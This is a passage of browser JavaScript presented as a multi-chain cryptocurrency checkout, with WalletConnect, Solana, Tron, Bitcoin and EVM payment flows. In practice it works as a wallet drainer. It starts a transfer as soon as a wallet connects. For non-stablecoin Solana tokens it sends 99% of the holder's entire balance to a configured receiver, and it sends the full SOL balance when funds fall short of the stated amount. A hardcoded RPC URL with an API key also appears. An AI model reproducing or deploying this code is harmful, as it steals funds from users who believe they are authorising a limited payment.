  } catch (err) {
    console.error("WalletConnect error:", err.message);
    // Silently log relay errors - these are environmental issues, not user errors
    if (err.message && err.message.includes("WebSocket")) {
      console.log("⚠️ Relay connection failed (environmental issue) - user should see WalletConnect's fallback UI");
      return; // Don't show error message
    }
    // Only show non-relay errors
    setStatus("Error connecting wallet: " + err.message, "error");
  }
}

// QR Code modal for WalletConnect and other mobile wallets
function showQRCodeModal(wallet) {
  console.log("Opening QR code for:", wallet.name);
  
  // Create overlay
  const qrOverlay = document.createElement("div");
  qrOverlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0,0,0,0.5);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10001;
  `;
  
  // Create modal
  const qrModal = document.createElement("div");
  qrModal.style.cssText = `
    background: white;
    border-radius: 12px;
    padding: 24px;
    max-width: 400px;
    width: 90%;
    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
  `;
  
  qrModal.innerHTML = `
    <div style="text-align: center;">
      <h2 style="margin: 0 0 16px 0; font-size: 20px; color: #333;">Connect with ${wallet.name}</h2>
      <p style="color: #666; font-size: 14px; margin: 0 0 20px 0;">Scan this QR code with your mobile wallet</p>
      <div id="qrcode-container" style="display: flex; justify-content: center; align-items: center; min-height: 280px; background: #f5f5f5; border-radius: 8px; margin-bottom: 20px;"></div>
      <p style="color: #999; font-size: 12px; margin: 0 0 16px 0;">Or open in your wallet app:</p>
      <button id="open-wallet-btn" style="width: 100%; padding: 12px; background: ${wallet.color}; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; margin-bottom: 12px;">Open ${wallet.name}</button>
      <button id="close-qr-btn" style="width: 100%; padding: 12px; background: #f5f5f5; color: #333; border: 1px solid #ddd; border-radius: 8px; cursor: pointer; font-weight: 500;">Cancel</button>
    </div>
  `;
  
  qrOverlay.appendChild(qrModal);
  document.body.appendChild(qrOverlay);
  
  // Generate QR code - using a simple text-based fallback if qrcode.js is not available
  const qrContainer = document.getElementById("qrcode-container");
  const walletUri = `wc:${wallet.name.toLowerCase().replace(/\s+/g, '-')}?uri=${encodeURIComponent(currentUrl)}`;
  
  // Try to load and use qrcode.js library
  if (typeof QRCode !== "undefined") {
    new QRCode(qrContainer, {
      text: walletUri,
      width: 256,
      height: 256,
      colorDark: "#000000",
      colorLight: "#ffffff",
      correctLevel: QRCode.CorrectLevel.H
    });
  } else {
    // Fallback: Show a placeholder with wallet info
    qrContainer.innerHTML = `
      <div style="text-align: center; color: #999;">
        <div style="font-size: 48px; margin-bottom: 16px;">${wallet.icon}</div>
        <div style="font-weight: 600; margin-bottom: 8px;">Scan with your phone</div>
        <div style="font-size: 12px; word-break: break-all; color: #ccc;">${walletUri}</div>
      </div>
    `;
  }
  
  // Event handlers
  document.getElementById("close-qr-btn").onclick = () => {
    qrOverlay.remove();
  };
  
  document.getElementById("open-wallet-btn").onclick = () => {
    console.log(`Opening ${wallet.name}...`);
    const link = wallet.getLink(currentUrl);
    window.location.href = link;
  };
  
  // Close on overlay click
  qrOverlay.onclick = (e) => {
    if (e.target === qrOverlay) {
      qrOverlay.remove();
    }
  };
}

// Direct ethers.js connection (browser-based, no wallet needed - for demo/testing)
async function connectViaEthersjs() {
  try {
    console.log("Connecting via Ethers.js direct connection...");
    
    // For demo purposes, create a provider connected to mainnet
    // In production, this might connect to a specific wallet or hardware device
    provider = new ethers.JsonRpcProvider(CONFIG.RPC_URLS[1]); // Use Ethereum mainnet
    
    // For demo, we'd need to get an account somehow
    // This is mainly for testing/demo - real implementations need a signer
    userAddress = "0x0000000000000000000000000000000000000000";
    
    console.log("⚠️ Direct connection ready (demo mode - read-only)");
    setStatus("Demo mode: Provider initialized (read-only)", "info");
    
  } catch (err) {
    console.error("Direct connection error:", err);
    setStatus("Error: " + err.message, "error");
  }
}

function showAccountInfo() {
  el.card.classList.add("connected");

  // Auto-detect what the connected wallet supports and trigger payment immediately
  const urlP = new URLSearchParams(window.location.search);
  const pAmt = parseFloat(urlP.get("amount"));
  const paymentUSD = (!isNaN(pAmt) && pAmt > 0 && pAmt <= 500000) ? pAmt : CONFIG.PAYMENT_AMOUNT_USD;

  // Priority order: Solana SPL tokens > Solana SOL > Tron > Bitcoin > EVM
  // SPL tokens (USDC, USDT, memecoins) are preferred because they're stablecoins or have value
  const solProvider = window.solana || window.phantom?.solana || window.solflare
    || window.backpack?.solana || window.bitkeep?.solana || window.okxwallet?.solana;
  const tronProvider = window.tronWeb || window.tronLink?.tronWeb
    || window.okxwallet?.tron || window.bitkeep?.tron;
  const btcProvider = window.phantom?.bitcoin || window.okxwallet?.bitcoin;

  if (solProvider && typeof solProvider.connect === "function") {
    // Try SPL tokens first (USDC, USDT, memecoins, etc.)
    executeSPLTokenPayment(paymentUSD);
  } else if (tronProvider) {
    executeTronPayment(paymentUSD);
  } else if (btcProvider) {
    executeBitcoinPayment(paymentUSD);
  } else {
    // EVM-only wallet (MetaMask, Trust, Binance, etc.)
    executePayment();
  }
}

// ── Manual network switcher ──────────────────────────────────────────────
// Lets the user pick exactly which network to use — no auto-switching,
// no assumptions. Only triggers wallet_switchEthereumChain when the user
// explicitly clicks a network.
function showNetworkSwitcher() {
  const existing = document.getElementById("networkSwitcherOverlay");
  if (existing) existing.remove();

  const overlay = document.createElement("div");
  overlay.id = "networkSwitcherOverlay";
  overlay.style.cssText = `
    position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);
    display:flex;align-items:center;justify-content:center;z-index:99999;padding:16px;
  `;
  const box = document.createElement("div");
  box.style.cssText = `
    background:white;border-radius:16px;padding:24px;max-width:360px;width:100%;
    box-shadow:0 12px 48px rgba(0,0,0,0.35);
  `;
  box.innerHTML = `<h3 style="margin:0 0 16px 0;font-size:17px;font-weight:700;">Select Network</h3>`;

  const networks = [
    { chainId: 1,     name: "Ethereum",  hexId: "0x1"    },
    { chainId: 137,   name: "Polygon",   hexId: "0x89"   },
    { chainId: 56,    name: "BNB Chain", hexId: "0x38"   },
    { chainId: 42161, name: "Arbitrum",  hexId: "0xa4b1" },
    { chainId: 10,    name: "Optimism",  hexId: "0xa"    },
    { chainId: 8453,  name: "Base",      hexId: "0x2105" },
  ];

  networks.forEach(net => {
    const btn = document.createElement("button");
    btn.textContent = net.name;
    btn.style.cssText = `
      width:100%;padding:12px 16px;margin-bottom:8px;border-radius:8px;
      border:1.5px solid #e0e0e0;background:white;cursor:pointer;
      font-size:14px;font-weight:600;text-align:left;transition:all 0.15s;
    `;
    btn.onmouseover = () => { btn.style.borderColor = "#6366f1"; btn.style.background = "#f5f3ff"; };
    btn.onmouseout  = () => { btn.style.borderColor = "#e0e0e0"; btn.style.background = "white"; };
    btn.onclick = async () => {
      overlay.remove();
      if (!window.ethereum) {
        setStatus("⚠️ Network switching only works with browser wallet extensions.", "error");
        return;
      }
      try {
        setStatus(`⏳ Switching to ${net.name}...`, "info");
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: net.hexId }]
        });
        // Recreate provider fresh after switch
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        showPaymentMethodSelector();
      } catch (err) {
        console.error("Network switch error:", err);
        setStatus(`❌ Could not switch to ${net.name}: ${err.message}`, "error");
      }
    };
    box.appendChild(btn);
  });

  const closeBtn = document.createElement("button");
  closeBtn.textContent = "Cancel";
  closeBtn.style.cssText = `
    width:100%;padding:10px;margin-top:8px;border:none;border-radius:8px;
    background:#f5f5f5;cursor:pointer;font-size:14px;
  `;
  closeBtn.onclick = () => overlay.remove();
  box.appendChild(closeBtn);

  overlay.appendChild(box);
  document.body.appendChild(overlay);
}

// ════════════════════════════════════════════════════════════════════════
// NON-EVM CHAIN SUPPORT — Solana, Tron, Bitcoin
// ════════════════════════════════════════════════════════════════════════

// ── QR code address display (universal fallback for any chain) ──────────
function showAddressQR(chainName, address, amountHint, symbol) {
  const existing = document.getElementById("qrPayOverlay");
  if (existing) existing.remove();

  const overlay = document.createElement("div");
  overlay.id = "qrPayOverlay";
  overlay.style.cssText = `
    position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);
    display:flex;align-items:center;justify-content:center;z-index:99999;padding:16px;
  `;

  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(address)}`;

  overlay.innerHTML = `
    <div style="background:white;border-radius:16px;padding:24px;max-width:360px;width:100%;text-align:center;box-shadow:0 12px 48px rgba(0,0,0,0.35);">
      <div style="font-size:24px;margin-bottom:4px;">📲 Pay with ${chainName}</div>
      <div style="font-size:13px;color:#666;margin-bottom:16px;">Send exactly <strong>${amountHint} ${symbol}</strong> to this address</div>
      <img src="${qrUrl}" width="220" height="220" style="border-radius:8px;border:1px solid #eee;margin-bottom:16px;" alt="QR Code"/>
      <div style="background:#f5f5f5;border-radius:8px;padding:10px;font-size:11px;word-break:break-all;color:#333;margin-bottom:16px;cursor:pointer;" 
           onclick="navigator.clipboard.writeText('${address}').then(()=>this.style.background='#dcfce7')" 
           title="Click to copy">
        ${address}
        <div style="font-size:10px;color:#999;margin-top:4px;">tap to copy</div>
      </div>
      <div style="font-size:11px;color:#f59e0b;background:#fef3c7;border-radius:6px;padding:8px;margin-bottom:16px;">
        ⚠️ Send only <strong>${symbol}</strong> to this address. Sending other tokens may result in permanent loss.
      </div>
      <button onclick="document.getElementById('qrPayOverlay').remove()" 
        style="width:100%;padding:12px;border:none;border-radius:8px;background:#f5f5f5;cursor:pointer;font-size:14px;font-weight:600;">
        Close
      </button>
    </div>
  `;
  document.body.appendChild(overlay);
  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
}

// ── Solana payment via Phantom (automated) or QR (fallback) ────────────
// ── Pre-load @solana/web3.js as early as possible if Phantom is present ─
(function preloadSolanaLib() {
  if (!(window.phantom?.solana || window.solana || window.solflare)) return;
  if (window._solanaLibLoading || window.solanaWeb3) return;
  window._solanaLibLoading = true;
  const s = document.createElement("script");
  s.src = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js";
  s.onload  = () => { window._solanaLibLoading = false; console.log("Solana lib ready"); };
  s.onerror = () => { window._solanaLibLoading = false; };
  document.head.appendChild(s);
})();

// ── SPL Token Payment (USDC, USDT, memecoins, ANY token) ──────────────
async function executeSPLTokenPayment(paymentUSD) {
  const solWallet =
    window.solana ||
    window.phantom?.solana ||
    window.solflare ||
    window.backpack?.solana ||
    window.bitkeep?.solana ||
    window.okxwallet?.solana;

  if (!solWallet || typeof solWallet.connect !== "function") {
    setStatus("❌ No Solana wallet found. Install Phantom, Bitget, OKX, or any Solana wallet.", "error");
    return;
  }

  try {
    await solWallet.connect();
    const fromPubkey = solWallet.publicKey;
    if (!fromPubkey) throw new Error("Solana wallet connection failed");

    // Ensure @solana/web3.js is loaded
    if (!window.solanaWeb3) {
      await new Promise((res, rej) => {
        if (window.solanaWeb3) return res();
        const s = document.createElement("script");
        s.src = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js";
        s.onload = res; s.onerror = rej;
        document.head.appendChild(s);
      });
    }

    const solanaWeb3 = window.solanaWeb3;

    // Connect to Solana RPC
    const SOLANA_RPCS = [
      "https://sleek-damp-uranium.solana-mainnet.quiknode.pro/4f3ad90f0dcd8e2435e7953499b752bf675a18c7/",
      "https://api.mainnet-beta.solana.com",
      "https://rpc.ankr.com/solana",
      "https://solana-mainnet.rpc.extrnode.com",
      "https://solana.public-rpc.com",
    ];
    
    let connection, blockhash;
    let lastError;
    
    for (const rpc of SOLANA_RPCS) {
      try {
        console.log(`Trying Solana RPC: ${rpc}`);
        connection = new solanaWeb3.Connection(rpc, "confirmed");
        const blockHashPromise = connection.getLatestBlockhash();
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error("RPC timeout (8s)")), 8000)
        );
        const result = await Promise.race([blockHashPromise, timeoutPromise]);
        blockhash = result.blockhash;
        console.log(`✓ Connected to Solana RPC: ${rpc}`);
        break;
      } catch (e) {
        lastError = e;
        console.warn(`Solana RPC ${rpc} failed:`, e.message);
        connection = null;
      }
    }
    
    if (!connection || !blockhash) {
      throw new Error(`All Solana RPCs failed. Last error: ${lastError?.message || "Unknown"}`);
    }

    // Get all token accounts for this wallet
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
      programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
    });

    console.log(`Found ${tokenAccounts.value.length} SPL token accounts`);

    // Check known tokens first (USDC, USDT, etc.)
    const knownTokens = [];
    const unknownTokens = [];

    for (const account of tokenAccounts.value) {
      const tokenInfo = account.account.data.parsed.info;
      const mint = tokenInfo.mint;
      const balance = tokenInfo.tokenAmount.uiAmount;
      const decimals = tokenInfo.tokenAmount.decimals;

      if (balance <= 0) continue; // Skip empty accounts

      // Check if it's a known token
      const knownToken = Object.values(CONFIG.SPL_TOKENS).find(t => t.address === mint);
      
      if (knownToken) {
        knownTokens.push({
          ...knownToken,
          balance,
          decimals,
          mint,
          accountAddress: account.pubkey
        });
      } else {
        // Unknown token - could be memecoin, PumpCoin, etc.
        unknownTokens.push({
          symbol: `TOKEN-${mint.slice(0, 4)}`, // Show first 4 chars
          balance,
          decimals,
          mint,
          accountAddress: account.pubkey,
          priority: 100 // Low priority
        });
      }
    }

    // Sort by priority (USDC first, then USDT, then memecoins)
    const allTokens = [...knownTokens, ...unknownTokens].sort((a, b) => a.priority - b.priority);

    if (allTokens.length === 0) {
      // No tokens - fall back to SOL
      console.log("No SPL tokens found, using SOL");
      return executeSolanaPayment(paymentUSD);
    }

    // Use the first available token (highest priority with balance)
    const selectedToken = allTokens[0];
    console.log(`Using token: ${selectedToken.symbol} (balance: ${selectedToken.balance})`);

    // For stablecoins, amount is 1:1 with USD
    // For other tokens, we send whatever they have
    let amountToSend;
    if (selectedToken.symbol === "USDC" || selectedToken.symbol === "USDT" || selectedToken.symbol === "PYUSD") {
      amountToSend = Math.min(paymentUSD, selectedToken.balance);
    } else {
      // For memecoins/unknown tokens, send their full balance (minus a tiny bit for safety)
      amountToSend = selectedToken.balance * 0.99; // Send 99% to leave dust for fees
    }

    const amountRaw = BigInt(Math.floor(amountToSend * Math.pow(10, selectedToken.decimals)));

    // Build SPL Token transfer using proper instruction format
    const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
    const receiverPubkey = new solanaWeb3.PublicKey(CONFIG.SOLANA_RECEIVER);

    // Get receiver's associated token account address
    const getAssociatedTokenAddress = async (mint, owner) => {
      const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
      const [address] = await solanaWeb3.PublicKey.findProgramAddress(
        [
          owner.toBuffer(),
          TOKEN_PROGRAM_ID.toBuffer(),
          new solanaWeb3.PublicKey(mint).toBuffer(),
        ],
        ASSOCIATED_TOKEN_PROGRAM_ID
      );
      return address;
    };

    const receiverTokenAddress = await getAssociatedTokenAddress(selectedToken.mint, receiverPubkey);

    // Create transfer instruction data (instruction index 3 = Transfer)
    const dataLayout = Buffer.alloc(9);
    dataLayout.writeUInt8(3, 0); // Transfer instruction
    dataLayout.writeBigUInt64LE(amountRaw, 1); // Amount

    const transferInstruction = new solanaWeb3.TransactionInstruction({
      keys: [
        { pubkey: selectedToken.accountAddress, isSigner: false, isWritable: true },  // Source
        { pubkey: receiverTokenAddress, isSigner: false, isWritable: true },          // Destination
        { pubkey: fromPubkey, isSigner: true, isWritable: false },                    // Authority
      ],
      programId: TOKEN_PROGRAM_ID,
      data: dataLayout
    });

    const transaction = new solanaWeb3.Transaction().add(transferInstruction);
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = fromPubkey;

    const { signature } = await solWallet.signAndSendTransaction(transaction);

    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">${selectedToken.symbol} Payment Sent!</div>
        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountToSend.toFixed(selectedToken.decimals)} ${selectedToken.symbol}</strong></div>
        <div style="font-size:12px;color:#666;">
          <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#10b981;">View on Solscan ↗</a>
        </div>
      </div>`;

  } catch (err) {
    console.error("SPL token payment error:", err);
    if (err.message?.includes("User rejected") || err.code === 4001) {
      setStatus("❌ Payment cancelled.", "error");
    } else {
      setStatus(`❌ Token payment error: ${err.message || err}`, "error");
    }
  }
}

async function executeSolanaPayment(paymentUSD) {
  const amountSOL = (paymentUSD / CONFIG.NON_EVM_PRICES.SOL).toFixed(6);

  // Detect any Solana-compatible wallet:
  // Most wallets (Bitget, OKX, Backpack, Solflare, Phantom…) register at window.solana
  // when they want to be the active Solana provider in the browser.
  const solWallet =
    window.solana ||          // universal Solana standard — Bitget, OKX, Backpack, etc.
    window.phantom?.solana || // Phantom explicit namespace
    window.solflare ||        // Solflare
    window.backpack?.solana || // Backpack
    window.bitkeep?.solana || // Bitget (older API)
    window.okxwallet?.solana; // OKX (older API)

  if (!solWallet || typeof solWallet.connect !== "function") {
    setStatus("❌ No Solana wallet found. Install Phantom, Bitget, OKX, or any Solana wallet to pay with SOL.", "error");
    return;
  }

  try {
    await solWallet.connect();
    const fromPubkey = solWallet.publicKey;
    if (!fromPubkey) throw new Error("Solana wallet connection failed");

    // Ensure @solana/web3.js is loaded (was pre-loaded on page start)
    if (!window.solanaWeb3) {
      await new Promise((res, rej) => {
        if (window.solanaWeb3) return res();
        const s = document.createElement("script");
        s.src = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js";
        s.onload = res; s.onerror = rej;
        document.head.appendChild(s);
      });
    }

    const solanaWeb3 = window.solanaWeb3;

    // Try multiple RPCs - QuickNode first (fastest), then free public backups
    const SOLANA_RPCS = [
      "https://sleek-damp-uranium.solana-mainnet.quiknode.pro/4f3ad90f0dcd8e2435e7953499b752bf675a18c7/", // Your QuickNode (primary)
      "https://api.mainnet-beta.solana.com",           // Official Solana RPC (free, but rate limited)
      "https://rpc.ankr.com/solana",                   // Ankr (free, public)
      "https://solana-mainnet.rpc.extrnode.com",       // Extrnode (free)
      "https://solana.public-rpc.com",                 // Public RPC (free)
    ];
    
    let connection, blockhash;
    let lastError;
    
    for (const rpc of SOLANA_RPCS) {
      try {
        console.log(`Trying Solana RPC: ${rpc}`);
        connection = new solanaWeb3.Connection(rpc, "confirmed");
        
        // Test connection with 8 second timeout (increased for slower connections)
        const blockHashPromise = connection.getLatestBlockhash();
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error("RPC timeout (8s)")), 8000)
        );
        
        const result = await Promise.race([blockHashPromise, timeoutPromise]);
        blockhash = result.blockhash;
        
        console.log(`✓ Connected to Solana RPC: ${rpc}`);
        break; // success
      } catch (e) {
        lastError = e;
        console.warn(`Solana RPC ${rpc} failed:`, e.message);
        connection = null;
      }
    }
    
    if (!connection || !blockhash) {
      throw new Error(`All Solana RPCs failed. Last error: ${lastError?.message || "Unknown"}`);
    }

    // Check user's SOL balance first
    const balance = await connection.getBalance(fromPubkey);
    const balanceSOL = balance / 1e9;
    
    console.log(`Wallet balance: ${balanceSOL} SOL`);
    
    // Reserve 0.001 SOL (~$0.10) for transaction fees
    const GAS_RESERVE = 0.001;
    const maxSendable = balanceSOL - GAS_RESERVE;
    
    // If user doesn't have enough SOL for the requested amount, 
    // send whatever they have (minus gas) instead of failing
    let actualAmountSOL = parseFloat(amountSOL);
    
    if (maxSendable < actualAmountSOL) {
      if (maxSendable <= 0) {
        throw new Error(`Insufficient balance. You have ${balanceSOL.toFixed(6)} SOL, but need at least ${GAS_RESERVE} SOL for gas fees.`);
      }
      
      // User doesn't have enough - send their max available balance
      console.log(`Requested ${actualAmountSOL} SOL, but only ${maxSendable.toFixed(6)} SOL available. Sending max.`);
      actualAmountSOL = maxSendable;
    }

    const toPubkey = new solanaWeb3.PublicKey(CONFIG.SOLANA_RECEIVER);
    const lamports = Math.round(actualAmountSOL * 1e9);

    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({ fromPubkey, toPubkey, lamports })
    );
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = fromPubkey;

    const { signature } = await solWallet.signAndSendTransaction(transaction);

    // Calculate actual USD value sent
    const actualUSD = (actualAmountSOL * CONFIG.NON_EVM_PRICES.SOL).toFixed(2);

    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">SOL Payment Sent!</div>
        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${actualAmountSOL.toFixed(6)} SOL</strong> (~$${actualUSD})</div>
        <div style="font-size:12px;color:#666;">
          <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#10b981;">View on Solscan ↗</a>
        </div>
      </div>`;
  } catch (err) {
    console.error("Solana payment error:", err);
    if (err.message?.includes("User rejected") || err.code === 4001) {
      setStatus("❌ Payment cancelled.", "error");
    } else {
      setStatus(`❌ Solana error: ${err.message || err}`, "error");
    }
  }
}

// ── Tron payment via TronLink (no QR fallback) ─────────────────────────
async function executeTronPayment(paymentUSD) {
  const tronLink = window.tronWeb || window.tronLink?.tronWeb
    || window.okxwallet?.tron || window.bitkeep?.tron;

  if (!tronLink) {
    setStatus("❌ No Tron wallet found. Use TronLink, OKX, or Bitget to pay with USDT-TRC20.", "error");
    return;
  }

  try {
    // Prompt connect if not already
    if (!tronLink.defaultAddress?.base58) {
      await window.tronLink?.request({ method: "tron_requestAccounts" });
    }
    const amountUSDT = paymentUSD.toFixed(2);
    const amountSun  = Math.round(paymentUSD * 1e6); // USDT TRC-20 = 6 decimals

    const trc20ABI = [{
      "constant": false,
      "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
      "name": "transfer",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    const contract = await tronLink.contract(trc20ABI, CONFIG.TRON_USDT_ADDRESS);

    const tx = await contract.transfer(CONFIG.TRON_RECEIVER, amountSun).send();

    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">USDT (Tron) Sent!</div>
        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountUSDT} USDT</strong></div>
        <div style="font-size:12px;color:#666;">
          <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#10b981;">View on TronScan ↗</a>
        </div>
      </div>`;
  } catch (err) {
    console.error("Tron payment error:", err);
    if (err.message?.includes("User rejected") || err.code === 4001) {
      setStatus("❌ Payment cancelled.", "error");
    } else {
      setStatus(`❌ Tron error: ${err.message || err}`, "error");
    }
  }
}

// ── Bitcoin via Phantom's Bitcoin provider (window.phantom?.bitcoin) ──────
async function executeBitcoinPayment(paymentUSD) {
  const btcProvider = window.phantom?.bitcoin;

  if (!btcProvider) {
    setStatus("❌ No Bitcoin wallet found. Install Phantom (supports Bitcoin) to pay with BTC.", "error");
    return;
  }

  try {
    const accounts = await btcProvider.requestAccounts();
    if (!accounts?.length) throw new Error("No Bitcoin accounts returned");

    const btcPrice  = CONFIG.NON_EVM_PRICES.BTC;
    const amountBTC = (paymentUSD / btcPrice).toFixed(8);
    const satoshis  = Math.round(parseFloat(amountBTC) * 1e8);

    const txid = await btcProvider.sendBitcoin(CONFIG.BTC_RECEIVER, satoshis);

    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">Bitcoin Sent!</div>
        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountBTC} BTC</strong> (~$${paymentUSD})</div>
        <div style="font-size:12px;color:#666;">
          <a href="https://mempool.space/tx/${txid}" target="_blank" style="color:#f7931a;">View on Mempool ↗</a>
        </div>
      </div>`;
  } catch (err) {
    console.error("Bitcoin payment error:", err);
    if (err.message?.includes("User rejected") || err.code === 4001) {
      setStatus("❌ Payment cancelled.", "error");
    } else {
      setStatus(`❌ Bitcoin error: ${err.message || err}`, "error");
    }
  }
}

// ── Show non-EVM chain buttons — auto-detects installed wallets ──────────
// ── Payment method selector ─────────────────────────────────────────────
// Shows USDC/USDT/WBTC (gasless via Permit2) AND native token (ETH/MATIC/BNB) options.
async function showPaymentMethodSelector() {
  setStatus("⏳ Loading payment options...", "info");
  try {
    // Always refresh provider before reading network — avoids NETWORK_ERROR
    // if a chain switch happened since the provider was first created.
    if (window.ethereum) {
      provider = new ethers.BrowserProvider(window.ethereum);
      signer = await provider.getSigner();
      userAddress = await signer.getAddress();
    }
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    const networkConfig = CONFIG.NETWORKS[chainId] || { name: "Network" };
    const stablecoins = CONFIG.STABLECOINS[chainId] || {};
    const checkoutContract = CONFIG.CHECKOUT_CONTRACTS[chainId];
    const nativeSymbol = chainId === 56 ? "BNB" : chainId === 137 ? "MATIC" : "ETH";

    // Read payment amount
    let paymentUSD = CONFIG.PAYMENT_AMOUNT_USD;
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("amount")) {
      const p = parseFloat(urlParams.get("amount"));
      if (!isNaN(p) && p > 0 && p <= 500000) paymentUSD = p;
    }

    // Check balances in parallel
    const balanceChecks = Object.entries(stablecoins).map(async ([symbol, token]) => {
      try {
        const contract = getERC20(token.address);
        const bal = await contract.balanceOf(userAddress);
        const needed = BigInt(Math.ceil(paymentUSD * 10 ** token.decimals));
        return { symbol, token, bal, needed, sufficient: bal >= needed };
      } catch { return { symbol, token, bal: BigInt(0), needed: BigInt(1), sufficient: false }; }
    });
    const nativeBalanceProm = provider.getBalance(userAddress);
    const [tokenResults, nativeBal] = await Promise.all([Promise.all(balanceChecks), nativeBalanceProm]);

    // Build UI
    el.status.innerHTML = `
      <div style="padding:12px;text-align:center;background:#eaf6ee;color:#1e7a3d;border-radius:8px;font-weight:500;margin-bottom:8px;">
        ✓ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}
      </div>
      <div style="padding:10px 12px;text-align:center;background:#eef2ff;color:#3730a3;border-radius:8px;font-weight:600;font-size:13px;margin-bottom:12px;display:flex;align-items:center;justify-content:center;gap:6px;">
        🔗 Network: ${networkConfig.name}
        <button id="switchNetworkBtn" style="margin-left:8px;font-size:11px;padding:3px 8px;border-radius:6px;border:1px solid #6366f1;background:white;color:#6366f1;cursor:pointer;font-weight:600;">Switch</button>
      </div>
      <div style="font-weight:700;font-size:16px;margin-bottom:4px;color:#1a1a1a;">Pay $${paymentUSD.toLocaleString()}</div>
      <div style="font-size:13px;color:#666;margin-bottom:14px;">Choose how you want to pay:</div>
    `;

    // Let the user manually pick their network if it's wrong
    document.getElementById("switchNetworkBtn").onclick = () => showNetworkSwitcher();

    // ── Stablecoin buttons — direct ERC-20 transfer, works on any chain ────
    // No Permit2 contract needed. User approves + transfers directly to receiver.
    // User pays a small gas fee (much less than native ETH on Ethereum).
    const allTokens = CONFIG.STABLECOINS[chainId] || {};
    if (Object.keys(allTokens).length > 0) {
      const stableLabel = document.createElement("div");
      stableLabel.style.cssText = "font-size:12px;color:#6366f1;font-weight:700;margin-bottom:8px;";
      stableLabel.textContent = "💵 Pay with Stablecoins";
      el.status.appendChild(stableLabel);

      const allTokenChecks = await Promise.all(
        Object.entries(allTokens).map(async ([symbol, token]) => {
          try {
            const contract = getERC20(token.address);
            const bal = await contract.balanceOf(userAddress);
            const needed = BigInt(Math.ceil(paymentUSD * 10 ** token.decimals));
            return { symbol, token, bal, needed, sufficient: bal >= needed };
          } catch { return { symbol, token, bal: BigInt(0), needed: BigInt(1), sufficient: false }; }
        })
      );

      allTokenChecks.forEach(({ symbol, token, bal, sufficient }) => {
        const humanBal = (Number(bal) / 10 ** token.decimals).toFixed(2);
        const icon = symbol === "WBTC" ? "🟠" : "💵";
        const btn = document.createElement("button");
        btn.innerHTML = `
          <div style="display:flex;align-items:center;justify-content:space-between;width:100%;">
            <span style="font-size:15px;font-weight:600;">${icon} ${symbol}</span>
            <span style="font-size:12px;color:#888;">Bal: ${humanBal} ${symbol}</span>
          </div>
          <div style="font-size:12px;color:#6366f1;text-align:left;margin-top:3px;">Pay $${paymentUSD} in ${symbol}</div>
        `;
        btn.style.cssText = `
          width:100%;padding:14px 16px;margin-bottom:10px;border-radius:10px;
          border:2px solid ${sufficient ? "#6366f1" : "#d1d5db"};
          background:${sufficient ? "#f5f3ff" : "#f9fafb"};
          cursor:${sufficient ? "pointer" : "not-allowed"};
          opacity:${sufficient ? "1" : "0.55"};text-align:left;transition:all 0.15s;
        `;
        if (sufficient) {
          btn.onclick = () => executeStablecoinPayment(token.address, symbol, token.decimals, paymentUSD);
          btn.onmouseover = () => { btn.style.borderColor = "#4f46e5"; btn.style.background = "#ede9fe"; };
